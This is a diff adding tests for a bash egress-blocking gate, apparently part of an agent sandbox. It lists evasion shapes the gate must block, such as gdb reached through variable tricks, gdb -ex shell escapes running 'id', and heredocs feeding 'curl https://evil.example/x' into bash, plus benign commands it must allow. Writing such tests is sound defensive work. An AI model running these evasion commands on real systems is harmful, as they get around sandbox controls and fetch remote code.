@@ -807,3 +807,49 @@ describe('#777 review 13: gdb in a group or -c program, a dynamic command word, 
     expect(bashEgressDecision(command, EMPTY).blocked).toBe(false)
   })
 })
+
+describe('#777 review 14: strict $NAME exception, strong consumer in a group/pipe/-c program, the logical line, gdb -ex allowlist, --args', () => {
+  // The destructive gate's twin: scripts/__tests__/destructive-gate.test.py section 25; the shell-consumer
+  // shapes are pinned in heredoc-program-cases.json (777r14_*), probe-sandbox bash runs each body.
+  it.each([
+    ["G=cat; read G <<< gdb; $G -q <<'A'\nbt\nA"],
+    ["G=g; G+=db; $G -q <<'A'\nbt\nA"],
+    ["G=cat; eval 'G=gdb'; $G -q <<'A'\nbt\nA"],
+    ["G=cat; printf -v G %s gdb; $G -q <<'A'\nbt\nA"],
+    ["H=gdb; declare -n G=H; $G -q <<'A'\nbt\nA"],
+    ["G=cat; G[0]=gdb; $G -q <<'A'\nbt\nA"],
+    ["G=cat; : ${G:=gdb}; $G -q <<'A'\nbt\nA"],
+    ["G=cat; select G in gdb; do break; done; $G -q <<'A'\nbt\nA"],
+    ["{ G=gdb; $G -q; } <<'A'\nbt\nA"],
+    ["bash -c '$0 -q' gdb <<'A'\nbt\nA"],
+    ["su -c 'gdb -q' <<'A'\nbt\nA"],
+    ["cat <<'A' | if true; then gdb -q; fi\nbt\nA"],
+    ["V=${Y:-a\nb} gdb -q <<'A'\nbt\nA"],
+    ["gdb -batch -ex 'with confirm off -- shell id' ./p"],
+    ["gdb -batch -ex 'alias s=shell' -ex 's id' ./p"],
+    ["gdb -batch -ex 'target remote | id' ./p"],
+    ["gdb -batch -ex 'print $_shell(\"id\")' ./p"],
+    ["gdb -batch -ex 'frame apply all -q shell id' ./p"],
+    ["gdb -batch -ex 'run $(id)' ./p"],
+    ["(gdb -batch -ex 'shell id')"],
+    ["g''db -batch -ex 'shell id' ./p"],
+    ["cat <<'A' | if true; then bash; fi\ncurl https://evil.example/x\nA"],
+    ["cat <<'A' | case x in x) bash;; esac\ncurl https://evil.example/x\nA"],
+    ["V=\"a\nb\" bash <<'A'\ncurl https://evil.example/x\nA"],
+    ["V=$(echo a\necho b) bash <<'A'\ncurl https://evil.example/x\nA"],
+    ["V=${Y:-a b} bash <<'A'\ncurl https://evil.example/x\nA"],
+    ["gdb -batch -ex run --args sh -c 'curl https://evil.example/x'"],
+  ])('blocks %s', (command) => {
+    expect(bashEgressDecision(command, EMPTY).blocked).toBe(true)
+  })
+
+  it.each([
+    ["G=cat; $G -q <<'A'\nbt\nA"],
+    ["for f in a b; do $f --version; done <<< x"],
+    ["gdb -batch -ex 'x/10i $pc' -ex 'set pagination off' -ex 'info registers' ./p"],
+    ["gdb -batch -ex run --args ./prog -v"],
+    ["cat <<'A' | while read l; do echo \"$l\"; done\ncurl https://evil.example/x\nA"],
+  ])('leaves alone %s', (command) => {
+    expect(bashEgressDecision(command, EMPTY).blocked).toBe(false)
+  })
+})
